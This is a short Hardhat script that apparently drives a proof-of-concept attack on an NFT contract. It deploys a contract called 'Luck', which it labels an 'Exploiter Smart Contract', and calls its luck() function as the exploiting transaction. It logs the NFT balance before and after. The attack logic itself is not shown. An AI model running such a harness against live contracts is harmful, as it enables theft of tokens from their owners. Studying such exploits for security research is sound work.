const hre = require("hardhat");

async function main() {
  
  const Luck = await hre.ethers.getContractFactory("Luck");
  const luck = await Luck.deploy();
  await luck.deployed();

  console.log("[#] 👀 Exploiter Smart Contract deployed to:", luck.address);

  const pre_val = await luck.result();
  console.log("[#] 🧛‍♀️ Amount of NFT held before the attack:", pre_val.toString())

  const Txn = await luck.luck();
  console.log("[+] 🥷  Exploiting Transcation Hash:", Txn.hash);
  await Txn.wait();
  
  const val = await luck.result();
  console.log("[#] 🧛‍♀️ Amount of NFT held after the attack:", val.toString())

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
